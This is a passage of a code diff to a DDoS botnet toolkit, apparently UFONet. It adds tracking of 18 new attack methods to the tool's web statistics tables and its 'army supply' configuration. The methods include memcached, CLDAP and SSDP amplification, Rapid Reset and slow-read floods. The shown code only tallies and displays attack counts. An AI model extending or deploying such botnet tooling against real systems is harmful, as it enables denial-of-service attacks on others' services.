onclick=javascript:GridFilter('loris','"+str(grid_key)+"')>LORIS:</a></td><td align='center'><a id='filter_ufosyn' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('ufosyn','"+str(grid_key)+"')>UFOSYN:</a></td><td align='center'><a id='filter_spray' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('spray','"+str(grid_key)+"')>SPRAY:</a></td><td align='center'><a id='filter_smurf' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('smurf','"+str(grid_key)+"')>SMURF:</a></td><td align='center'><a id='filter_xmas' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('xmas','"+str(grid_key)+"')>XMAS:</a></td><td align='center'><a id='filter_nuke' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('nuke','"+str(grid_key)+"')>NUKE:</a></td><td align='center'><a id='filter_tachyon' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('tachyon','"+str(grid_key)+"')>TACHYON:</a></td><td align='center'><a id='filter_monlist' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('monlist','"+str(grid_key)+"')>MONLIST:</a></td><td align='center'><a id='filter_fraggle' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('fraggle','"+str(grid_key)+"')>FRAGGLE:</a></td><td align='center'><a id='filter_sniper' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('sniper','"+str(grid_key)+"')>SNIPER:</a></td><td align='center'><a id='filter_ufoack' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('ufoack','"+str(grid_key)+"')>UFOACK:</a></td><td align='center'><a id='filter_uforst' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('uforst','"+str(grid_key)+"')>UFORST:</a></td><td align='center'><a id='filter_droper' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('droper','"+str(grid_key)+"')>DROPER:</a></td><td align='center'><a id='filter_overlap' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('overlap','"+str(grid_key)+"')>OVERLAP:</a></td><td align='center'><a id='filter_pinger' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('pinger','"+str(grid_key)+"')>PINGER:</a></td><td align='center'><a id='filter_ufoudp' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('ufoudp','"+str(grid_key)+"')>UFOUDP:</a></td><td align='center'><a id='filter_contact' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('contact','"+str(grid_key)+"')>CONTACT:</a></td></tr>"
+                grid_table = "<center><u>MEMBERS STATS:</u></center><br><table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'><a id='filter_nickname' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('nickname','"+str(grid_key)+"')>NICK:</a></td><td align='center'><a id='filter_ranking' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('ranking','"+str(grid_key)+"')>RANK:</a></td><td align='center'><a id='filter_chargo' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('chargo','"+str(grid_key)+"')>CHARGO:</a></td><td align='center'><a id='filter_dorking' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('dorking','"+str(grid_key)+"')>DORKING:</a></td><td align='center'><a id='filter_transf' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('transferred','"+str(grid_key)+"')>TRANSF:</a></td><td align='center'><a id='filter_maxchargo' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('maxchargo','"+str(grid_key)+"')>MAX.CHARGO:</a></td><td align='center'><a id='filter_missions' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('missions','"+str(grid_key)+"')>MISSIONS:</a></td><td align='center'><a id='filter_attacks' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('attacks','"+str(grid_key)+"')>ATTACKS:</a></td><td align='center'><a id='filter_loic' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('loic','"+str(grid_key)+"')>LOIC:</a></td><td align='center'><a id='filter_loris' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('loris','"+str(grid_key)+"')>LORIS:</a></td><td align='center'><a id='filter_ufosyn' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('ufosyn','"+str(grid_key)+"')>UFOSYN:</a></td><td align='center'><a id='filter_spray' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('spray','"+str(grid_key)+"')>SPRAY:</a></td><td align='center'><a id='filter_smurf' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('smurf','"+str(grid_key)+"')>SMURF:</a></td><td align='center'><a id='filter_xmas' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('xmas','"+str(grid_key)+"')>XMAS:</a></td><td align='center'><a id='filter_nuke' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('nuke','"+str(grid_key)+"')>NUKE:</a></td><td align='center'><a id='filter_tachyon' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('tachyon','"+str(grid_key)+"')>TACHYON:</a></td><td align='center'><a id='filter_monlist' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('monlist','"+str(grid_key)+"')>MONLIST:</a></td><td align='center'><a id='filter_fraggle' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('fraggle','"+str(grid_key)+"')>FRAGGLE:</a></td><td align='center'><a id='filter_sniper' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('sniper','"+str(grid_key)+"')>SNIPER:</a></td><td align='center'><a id='filter_ufoack' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('ufoack','"+str(grid_key)+"')>UFOACK:</a></td><td align='center'><a id='filter_uforst' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('uforst','"+str(grid_key)+"')>UFORST:</a></td><td align='center'><a id='filter_droper' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('droper','"+str(grid_key)+"')>DROPER:</a></td><td align='center'><a id='filter_overlap' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('overlap','"+str(grid_key)+"')>OVERLAP:</a></td><td align='center'><a id='filter_pinger' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('pinger','"+str(grid_key)+"')>PINGER:</a></td><td align='center'><a id='filter_ufoudp' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('ufoudp','"+str(grid_key)+"')>UFOUDP:</a></td><td align='center'><a id='filter_memcached' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('memcached','"+str(grid_key)+"')>MEMCACHED:</a></td><td align='center'><a id='filter_chargen' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('chargen','"+str(grid_key)+"')>CHARGEN:</a></td><td align='center'><a id='filter_cldap' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('cldap','"+str(grid_key)+"')>CLDAP:</a></td><td align='center'><a id='filter_ssdp' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('ssdp','"+str(grid_key)+"')>SSDP:</a></td><td align='center'><a id='filter_qotd' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('qotd','"+str(grid_key)+"')>QOTD:</a></td><td align='center'><a id='filter_tftp' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('tftp','"+str(grid_key)+"')>TFTP:</a></td><td align='center'><a id='filter_wsdisco' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('wsdisco','"+str(grid_key)+"')>WSDISCO:</a></td><td align='center'><a id='filter_coap' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('coap','"+str(grid_key)+"')>COAP:</a></td><td align='center'><a id='filter_mssql' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('mssql','"+str(grid_key)+"')>MSSQL:</a></td><td align='center'><a id='filter_arms' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('arms','"+str(grid_key)+"')>ARMS:</a></td><td align='center'><a id='filter_plex' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('plex','"+str(grid_key)+"')>PLEX:</a></td><td align='center'><a id='filter_netbios' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('netbios','"+str(grid_key)+"')>NETBIOS:</a></td><td align='center'><a id='filter_ripv1' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('ripv1','"+str(grid_key)+"')>RIPV1:</a></td><td align='center'><a id='filter_middlebox' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('middlebox','"+str(grid_key)+"')>MIDDLEBOX:</a></td><td align='center'><a id='filter_slowread' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('slowread','"+str(grid_key)+"')>SLOWREAD:</a></td><td align='center'><a id='filter_goldeneye' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('goldeneye','"+str(grid_key)+"')>GOLDENEYE:</a></td><td align='center'><a id='filter_rapidreset' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('rapidreset','"+str(grid_key)+"')>RAPIDRESET:</a></td><td align='center'><a id='filter_finflood' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('finflood','"+str(grid_key)+"')>FINFLOOD:</a></td><td align='center'><a id='filter_contact' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('contact','"+str(grid_key)+"')>CONTACT:</a></td></tr>"
                 grid_key = pGet["grid_key"]
                 f = open("/tmp/out", "w")
                 self.list_grid_rev = reversed(self.list_grid) # order by DESC
-                for m in self.list_grid_rev: # rev(msg) = nickname, ranking, chargo, dorking, transf, maxchargo, missions, attacks, loic, loris, ufosyn, spray, smurf, xmas, nuke, tachyon, monlist, fraggle, sniper, ufoack, uforst, droper, overlap, pinger, ufoudp, contact, ID
+                for m in self.list_grid_rev: # rev(msg) = nickname, ranking, chargo, dorking, transf, maxchargo, missions, attacks, loic, loris, ufosyn, spray, smurf, xmas, nuke, tachyon, monlist, fraggle, sniper, ufoack, uforst, droper, overlap, pinger, ufoudp, [v2: memcached..finflood], contact, ID
                     if grid_msg_sep in m:
-                        version = m.count(grid_msg_sep) # check UFONet stream version (10->0.9|11->1.0|12->1.1|13->1.2|14->1.2.1|15->1.3|16->1.4|26->1.5)
+                        version = m.count(grid_msg_sep) # check UFONet stream version (10->0.9|11->1.0|12->1.1|13->1.2|14->1.2.1|15->1.3|16->1.4|26->1.5-1.9|44->2.0)
                         m = m.split(grid_msg_sep)
                         mothership_members = mothership_members + 1 # add new registered member to mothership stats
+                        grid_memcached = grid_chargen = grid_cldap = grid_ssdp = grid_qotd = grid_tftp = grid_wsdisco = grid_coap = grid_mssql = grid_arms = grid_plex = grid_netbios = grid_ripv1 = grid_middlebox = grid_slowread = grid_goldeneye = grid_rapidreset = grid_finflood = nodec_text
                         grid_nickname = m[0] # nickname
                         self.decrypt(grid_key, grid_nickname)
                         if self.decryptedtext:
@@ -7212,6 +7718,61 @@ function runCommandX(cmd,params) {
                                 mothership_ufoudp = mothership_ufoudp + grid_ufoudp
                             except:
                                 grid_ufoudp = nodec_text
+                            if version > 26: # v2.0: 18 new mods at positions 25-42
+                                _new_pos = [
+                                    (25, 'memcached'), (26, 'chargen'), (27, 'cldap'), (28, 'ssdp'),
+                                    (29, 'qotd'), (30, 'tftp'), (31, 'wsdisco'), (32, 'coap'),
+                                    (33, 'mssql'), (34, 'arms'), (35, 'plex'), (36, 'netbios'),
+                                    (37, 'ripv1'), (38, 'middlebox'), (39, 'slowread'),
+                                    (40, 'goldeneye'), (41, 'rapidreset'), (42, 'finflood'),
+                                ]
+                                for _idx, _name in _new_pos:
+                                    try:
+                                        _enc = m[_idx]
+                                    except Exception:
+                                        _enc = ""
+                                    self.decrypt(grid_key, _enc)
+                                    _dec = self.decryptedtext if self.decryptedtext else nodec_text
+                                    self.decryptedtext = ""
+                                    try:
+                                        _dec_int = int(_dec)
+                                        if _name == 'memcached':   mothership_memcached = mothership_memcached + _dec_int; grid_memcached = _dec_int
+                                        elif _name == 'chargen':   mothership_chargen = mothership_chargen + _dec_int; grid_chargen = _dec_int
+                                        elif _name == 'cldap':     mothership_cldap = mothership_cldap + _dec_int; grid_cldap = _dec_int
+                                        elif _name == 'ssdp':      mothership_ssdp = mothership_ssdp + _dec_int; grid_ssdp = _dec_int
+                                        elif _name == 'qotd':      mothership_qotd = mothership_qotd + _dec_int; grid_qotd = _dec_int
+                                        elif _name == 'tftp':      mothership_tftp = mothership_tftp + _dec_int; grid_tftp = _dec_int
+                                        elif _name == 'wsdisco':   mothership_wsdisco = mothership_wsdisco + _dec_int; grid_wsdisco = _dec_int
+                                        elif _name == 'coap':      mothership_coap = mothership_coap + _dec_int; grid_coap = _dec_int
+                                        elif _name == 'mssql':     mothership_mssql = mothership_mssql + _dec_int; grid_mssql = _dec_int
+                                        elif _name == 'arms':      mothership_arms = mothership_arms + _dec_int; grid_arms = _dec_int
+                                        elif _name == 'plex':      mothership_plex = mothership_plex + _dec_int; grid_plex = _dec_int
+                                        elif _name == 'netbios':   mothership_netbios = mothership_netbios + _dec_int; grid_netbios = _dec_int
+                                        elif _name == 'ripv1':     mothership_ripv1 = mothership_ripv1 + _dec_int; grid_ripv1 = _dec_int
+                                        elif _name == 'middlebox': mothership_middlebox = mothership_middlebox + _dec_int; grid_middlebox = _dec_int
+                                        elif _name == 'slowread':  mothership_slowread = mothership_slowread + _dec_int; grid_slowread = _dec_int
+                                        elif _name == 'goldeneye': mothership_goldeneye = mothership_goldeneye + _dec_int; grid_goldeneye = _dec_int
+                                        elif _name == 'rapidreset':mothership_rapidreset = mothership_rapidreset + _dec_int; grid_rapidreset = _dec_int
+                                        elif _name == 'finflood':  mothership_finflood = mothership_finflood + _dec_int; grid_finflood = _dec_int
+                                    except Exception:
+                                        if _name == 'memcached':   grid_memcached = nodec_text
+                                        elif _name == 'chargen':   grid_chargen = nodec_text
+                                        elif _name == 'cldap':     grid_cldap = nodec_text
+                                        elif _name == 'ssdp':      grid_ssdp = nodec_text
+                                        elif _name == 'qotd':      grid_qotd = nodec_text
+                                        elif _name == 'tftp':      grid_tftp = nodec_text
+                                        elif _name == 'wsdisco':   grid_wsdisco = nodec_text
+                                        elif _name == 'coap':      grid_coap = nodec_text
+                                        elif _name == 'mssql':     grid_mssql = nodec_text
+                                        elif _name == 'arms':      grid_arms = nodec_text
+                                        elif _name == 'plex':      grid_plex = nodec_text
+                                        elif _name == 'netbios':   grid_netbios = nodec_text
+                                        elif _name == 'ripv1':     grid_ripv1 = nodec_text
+                                        elif _name == 'middlebox': grid_middlebox = nodec_text
+                                        elif _name == 'slowread':  grid_slowread = nodec_text
+                                        elif _name == 'goldeneye': grid_goldeneye = nodec_text
+                                        elif _name == 'rapidreset':grid_rapidreset = nodec_text
+                                        elif _name == 'finflood':  grid_finflood = nodec_text
                         else:
                             grid_monlist = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not monlist present
                             self.decrypt(grid_key, grid_monlist)
@@ -7483,14 +8044,14 @@ function runCommandX(cmd,params) {
                         grid_ranking = str(grid_ranking)
                         if grid_ranking == nodec_text: # hide any data when user is encrypted
                             grid_contact = "<a href=javascript:alert('UNKNOWN!');>View</a>"
-                            grid_table += "<tr><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(nodec_text)+"</td><td align='center'>"+str(grid_contact)+"</td></tr>"
+                            grid_table += "<tr>" + ("<td align='center'>"+str(nodec_text)+"</td>")*25 + ("<td align='center'>"+str(nodec_text)+"</td>")*18 + "<td align='center'>"+str(grid_contact)+"</td></tr>"
                         else:
-                            grid_table += "<tr><td align='center'>"+str(grid_nickname)+"</td><td align='center'>"+str(grid_ranking)+"</td><td align='center'>"+str(grid_totalchargo)+"</td><td align='center'>"+str(grid_dorking)+"</td><td align='center'>"+str(grid_transferred)+"</td><td align='center'>"+str(grid_maxchargo)+"</td><td align='center'>"+str(grid_missions)+"</td><td align='center'>"+str(grid_attacks)+"</td><td align='center'>"+str(grid_loic)+"</td><td align='center'>"+str(grid_loris)+"</td><td align='center'>"+str(grid_ufosyn)+"</td><td align='center'>"+str(grid_spray)+"</td><td align='center'>"+str(grid_smurf)+"</td><td align='center'>"+str(grid_xmas)+"</td><td align='center'>"+str(grid_nuke)+"</td><td align='center'>"+str(grid_tachyon)+"</td><td align='center'>"+str(grid_monlist)+"</td><td align='center'>"+str(grid_fraggle)+"</td><td align='center'>"+str(grid_sniper)+"</td><td align='center'>"+str(grid_ufoack)+"</td><td align='center'>"+str(grid_uforst)+"</td><td align='center'>"+str(grid_droper)+"</td><td align='center'>"+str(grid_overlap)+"</td><td align='center'>"+str(grid_pinger)+"</td><td align='center'>"+str(grid_ufoudp)+"</td><td align='center'>"+str(grid_contact)+"</td></tr>"
+                            grid_table += "<tr><td align='center'>"+str(grid_nickname)+"</td><td align='center'>"+str(grid_ranking)+"</td><td align='center'>"+str(grid_totalchargo)+"</td><td align='center'>"+str(grid_dorking)+"</td><td align='center'>"+str(grid_transferred)+"</td><td align='center'>"+str(grid_maxchargo)+"</td><td align='center'>"+str(grid_missions)+"</td><td align='center'>"+str(grid_attacks)+"</td><td align='center'>"+str(grid_loic)+"</td><td align='center'>"+str(grid_loris)+"</td><td align='center'>"+str(grid_ufosyn)+"</td><td align='center'>"+str(grid_spray)+"</td><td align='center'>"+str(grid_smurf)+"</td><td align='center'>"+str(grid_xmas)+"</td><td align='center'>"+str(grid_nuke)+"</td><td align='center'>"+str(grid_tachyon)+"</td><td align='center'>"+str(grid_monlist)+"</td><td align='center'>"+str(grid_fraggle)+"</td><td align='center'>"+str(grid_sniper)+"</td><td align='center'>"+str(grid_ufoack)+"</td><td align='center'>"+str(grid_uforst)+"</td><td align='center'>"+str(grid_droper)+"</td><td align='center'>"+str(grid_overlap)+"</td><td align='center'>"+str(grid_pinger)+"</td><td align='center'>"+str(grid_ufoudp)+"</td><td align='center'>"+str(grid_memcached)+"</td><td align='center'>"+str(grid_chargen)+"</td><td align='center'>"+str(grid_cldap)+"</td><td align='center'>"+str(grid_ssdp)+"</td><td align='center'>"+str(grid_qotd)+"</td><td align='center'>"+str(grid_tftp)+"</td><td align='center'>"+str(grid_wsdisco)+"</td><td align='center'>"+str(grid_coap)+"</td><td align='center'>"+str(grid_mssql)+"</td><td align='center'>"+str(grid_arms)+"</td><td align='center'>"+str(grid_plex)+"</td><td align='center'>"+str(grid_netbios)+"</td><td align='center'>"+str(grid_ripv1)+"</td><td align='center'>"+str(grid_middlebox)+"</td><td align='center'>"+str(grid_slowread)+"</td><td align='center'>"+str(grid_goldeneye)+"</td><td align='center'>"+str(grid_rapidreset)+"</td><td align='center'>"+str(grid_finflood)+"</td><td align='center'>"+str(grid_contact)+"</td></tr>"
                     except:
-                        grid_table += "<tr><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td><td align='center'>ERROR!</td></tr>"
+                        grid_table += "<tr>" + ("<td align='center'>ERROR!</td>")*43 + "</tr>"
                 grid_table += "</table><br>"
                 l = time.ctime(os.path.getmtime(self.grid_file)) # get last modified time
-                mother_table = "<center><u>MOTHERSHIP STATS:</u> (Last Update: <font color='green'>"+str(l)+"</font>)</center><br><table cellpadding='5' cellspacing='5' border='1'><tr><td><font color='green'>MEMBERS:</font></td><td align='right'><font color='green'>"+str(mothership_members)+"</font></td><td><font color='orange' size='4'>-</font></td><td align='right'><font color='orange' size='4'>"+str(unknown_members)+"</font></td><td><font color='white' size='4'>*</font></td><td align='right'><font color='white' size='4'>"+str(member_1)+"</font></td><td><font color='cyan' size='4'>**</font></td><td align='right'><font color='cyan' size='4'>"+str(member_2)+"</font></td><td><font color='blueviolet' size='4'>***</font></td><td align='right'><font color='blueviolet' size='4'>"+str(member_3)+"</font></td><td><font color='blue' size='4'>****</font></td><td align='right'><font color='blue' size='4'>"+str(member_4)+"</font></td><td><font color='red' size='4'>&#x25BC;</font></td><td align='right'><font color='red' size='4'>"+str(member_5)+"</font></td></tr></table><br><table cellpadding='5' cellspacing='5' border='1'><tr><td>MISSIONS:</td><td align='right'>"+str(mothership_missions)+"</td><td>ATTACKS:</td><td align='right'>"+str(mothership_attacks)+"</td><td>CHARGO (ACTIVE!):</td><td align='right'>"+str(mothership_chargo)+"</td><td>DORKING:</td><td align='right'>"+str(mothership_dorking)+"</td><td>TRANSF:</td><td align='right'>"+str(mothership_transferred)+"</td><td>MAX.CHARGO:</td><td align='right'>"+str(mothership_maxchargo)+"</td></tr></table><br><table cellpadding='5' cellspacing='5' border='1'><tr><td>LOIC:</td><td align='right'>"+str(mothership_loic)+"</td><td>LORIS:</td><td align='right'>"+str(mothership_loris)+"</td><td>UFOSYN:</td><td align='right'>"+str(mothership_ufosyn)+"</td><td>SPRAY:</td><td align='right'>"+str(mothership_spray)+"</td><td>SMURF:</td><td align='right'>"+str(mothership_smurf)+"</td></tr><tr><td>XMAS:</td><td align='right'>"+str(mothership_xmas)+"</td><td>NUKE:</td><td align='right'>"+str(mothership_nuke)+"</td><td>TACHYON:</td><td align='right'>"+str(mothership_tachyon)+"</td><td>MONLIST:</td><td align='right'>"+str(mothership_monlist)+"</td></tr><tr><td>FRAGGLE:</td><td align='right'>"+str(mothership_fraggle)+"</td><td>SNIPER:</td><td align='right'>"+str(mothership_sniper)+"</td><td>UFOACK:</td><td align='right'>"+str(mothership_ufoack)+"</td><td>UFORST:</td><td align='right'>"+str(mothership_uforst)+"</td></tr><tr><td>DROPER:</td><td align='right'>"+str(mothership_droper)+"</td><td>OVERLAP:</td><td align='right'>"+str(mothership_overlap)+"</td><td>PINGER:</td><td align='right'>"+str(mothership_pinger)+"</td><td>UFOUDP:</td><td align='right'>"+str(mothership_ufoudp)+"</td></tr></table><br><hr><br>"
+                mother_table = "<center><u>MOTHERSHIP STATS:</u> (Last Update: <font color='green'>"+str(l)+"</font>)</center><br><table cellpadding='5' cellspacing='5' border='1'><tr><td><font color='green'>MEMBERS:</font></td><td align='right'><font color='green'>"+str(mothership_members)+"</font></td><td><font color='orange' size='4'>-</font></td><td align='right'><font color='orange' size='4'>"+str(unknown_members)+"</font></td><td><font color='white' size='4'>*</font></td><td align='right'><font color='white' size='4'>"+str(member_1)+"</font></td><td><font color='cyan' size='4'>**</font></td><td align='right'><font color='cyan' size='4'>"+str(member_2)+"</font></td><td><font color='blueviolet' size='4'>***</font></td><td align='right'><font color='blueviolet' size='4'>"+str(member_3)+"</font></td><td><font color='blue' size='4'>****</font></td><td align='right'><font color='blue' size='4'>"+str(member_4)+"</font></td><td><font color='red' size='4'>&#x25BC;</font></td><td align='right'><font color='red' size='4'>"+str(member_5)+"</font></td></tr></table><br><table cellpadding='5' cellspacing='5' border='1'><tr><td>MISSIONS:</td><td align='right'>"+str(mothership_missions)+"</td><td>ATTACKS:</td><td align='right'>"+str(mothership_attacks)+"</td><td>CHARGO (ACTIVE!):</td><td align='right'>"+str(mothership_chargo)+"</td><td>DORKING:</td><td align='right'>"+str(mothership_dorking)+"</td><td>TRANSF:</td><td align='right'>"+str(mothership_transferred)+"</td><td>MAX.CHARGO:</td><td align='right'>"+str(mothership_maxchargo)+"</td></tr></table><br><table cellpadding='5' cellspacing='5' border='1'><tr><td>LOIC:</td><td align='right'>"+str(mothership_loic)+"</td><td>LORIS:</td><td align='right'>"+str(mothership_loris)+"</td><td>UFOSYN:</td><td align='right'>"+str(mothership_ufosyn)+"</td><td>SPRAY:</td><td align='right'>"+str(mothership_spray)+"</td><td>SMURF:</td><td align='right'>"+str(mothership_smurf)+"</td></tr><tr><td>XMAS:</td><td align='right'>"+str(mothership_xmas)+"</td><td>NUKE:</td><td align='right'>"+str(mothership_nuke)+"</td><td>TACHYON:</td><td align='right'>"+str(mothership_tachyon)+"</td><td>MONLIST:</td><td align='right'>"+str(mothership_monlist)+"</td></tr><tr><td>FRAGGLE:</td><td align='right'>"+str(mothership_fraggle)+"</td><td>SNIPER:</td><td align='right'>"+str(mothership_sniper)+"</td><td>UFOACK:</td><td align='right'>"+str(mothership_ufoack)+"</td><td>UFORST:</td><td align='right'>"+str(mothership_uforst)+"</td></tr><tr><td>DROPER:</td><td align='right'>"+str(mothership_droper)+"</td><td>OVERLAP:</td><td align='right'>"+str(mothership_overlap)+"</td><td>PINGER:</td><td align='right'>"+str(mothership_pinger)+"</td><td>UFOUDP:</td><td align='right'>"+str(mothership_ufoudp)+"</td></tr><tr><td>MEMCACHED:</td><td align='right'>"+str(mothership_memcached)+"</td><td>CHARGEN:</td><td align='right'>"+str(mothership_chargen)+"</td><td>CLDAP:</td><td align='right'>"+str(mothership_cldap)+"</td><td>SSDP:</td><td align='right'>"+str(mothership_ssdp)+"</td></tr><tr><td>QOTD:</td><td align='right'>"+str(mothership_qotd)+"</td><td>TFTP:</td><td align='right'>"+str(mothership_tftp)+"</td><td>WSDISCO:</td><td align='right'>"+str(mothership_wsdisco)+"</td><td>COAP:</td><td align='right'>"+str(mothership_coap)+"</td></tr><tr><td>MSSQL:</td><td align='right'>"+str(mothership_mssql)+"</td><td>ARMS:</td><td align='right'>"+str(mothership_arms)+"</td><td>PLEX:</td><td align='right'>"+str(mothership_plex)+"</td><td>NETBIOS:</td><td align='right'>"+str(mothership_netbios)+"</td></tr><tr><td>RIPV1:</td><td align='right'>"+str(mothership_ripv1)+"</td><td>MIDDLEBOX:</td><td align='right'>"+str(mothership_middlebox)+"</td><td>SLOWREAD:</td><td align='right'>"+str(mothership_slowread)+"</td><td>GOLDENEYE:</td><td align='right'>"+str(mothership_goldeneye)+"</td></tr><tr><td>RAPIDRESET:</td><td align='right'>"+str(mothership_rapidreset)+"</td><td>FINFLOOD:</td><td align='right'>"+str(mothership_finflood)+"</td></tr></table><br><hr><br>"
                 f.write(mother_table)
                 f.write(grid_table)
                 f.write(end_mark)
@@ -7522,7 +8083,7 @@ function runCommandX(cmd,params) {
                     else: # generate default global army supply configuration file
                         print('[Info] [AI] Cannot found: "core/json/supplycfg.json" -> [Generating!]')
                         with open(self.mothership_supplycfg_file, "w") as f:
-                            json.dump({"botnet": 1, "loic": 0, "loris": 0, "ufosyn": 0, "spray": 0, "smurf": 0, "xmas": 0, "nuke": 0, "tachyon": 0, "monlist": 0, "fraggle": 0, "sniper": 0, "ufoack": 0, "uforst": 0, "droper": 0, "overlap": 0, "pinger": 0, "ufoudp": 0}, f, indent=4)
+                            json.dump({"botnet": 1, "loic": 0, "loris": 0, "ufosyn": 0, "spray": 0, "smurf": 0, "xmas": 0, "nuke": 0, "tachyon": 0, "monlist": 0, "fraggle": 0, "sniper": 0, "ufoack": 0, "uforst": 0, "droper": 0, "overlap": 0, "pinger": 0, "ufoudp": 0, "memcached": 0, "chargen": 0, "cldap": 0, "ssdp": 0, "qotd": 0, "tftp": 0, "wsdisco": 0, "coap": 0, "mssql": 0, "arms": 0, "plex": 0, "netbios": 0, "ripv1": 0, "middlebox": 0, "rapidreset": 0, "slowread": 0, "goldeneye": 0, "finflood": 0}, f, indent=4)
                 with open(self.mothership_supplycfg_file) as data_file:
                     data = json.load(data_file)
                 self.supply_botnet = data["botnet"]
@@ -7543,12 +8104,30 @@ function runCommandX(cmd,params) {
                 self.supply_overlap = data["overlap"]
                 self.supply_pinger = data["pinger"]
                 self.supply_ufoudp = data["ufoudp"]
+                self.supply_memcached = data.get("memcached", 0)
+                self.supply_chargen = data.get("chargen", 0)
+                self.supply_cldap = data.get("cldap", 0)
+                self.supply_ssdp = data.get("ssdp", 0)
+                self.supply_qotd = data.get("qotd", 0)
+                self.supply_tftp = data.get("tftp", 0)
+                self.supply_wsdisco = data.get("wsdisco", 0)
+                self.supply_coap = data.get("coap", 0)
+                self.supply_mssql = data.get("mssql", 0)
+                self.supply_arms = data.get("arms", 0)
+                self.supply_plex = data.get("plex", 0)
+                self.supply_netbios = data.get("netbios", 0)
+                self.supply_ripv1 = data.get("ripv1", 0)
+                self.supply_middlebox = data.get("middlebox", 0)
+                self.supply_rapidreset = data.get("rapidreset", 0)
+                self.supply_slowread = data.get("slowread", 0)
+                self.supply_goldeneye = data.get("goldeneye", 0)
+                self.supply_finflood = data.get("finflood", 0)
                 f = open(self.wargames_file,"r")
                 ls = f.readlines()
                 f.close()
                 if ls:
